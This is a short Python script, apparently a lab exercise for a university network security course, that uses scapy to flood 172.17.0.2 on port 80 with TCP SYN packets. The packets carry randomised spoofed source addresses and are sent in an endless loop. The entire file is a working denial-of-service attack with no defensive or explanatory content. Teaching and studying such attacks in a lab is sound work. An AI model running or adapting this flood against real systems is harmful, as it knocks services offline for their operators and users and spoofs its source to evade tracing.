"""Simpe syn flood attack module for XJTU network security course"""

from scapy.all import *
from scapy.layers.inet import IP, TCP

if __name__ == "__main__":
    send(
        x=IP(src=RandIP(), dst="172.17.0.2") / fuzz(TCP(dport=80, flags=0x002)),
        loop=1,
    )
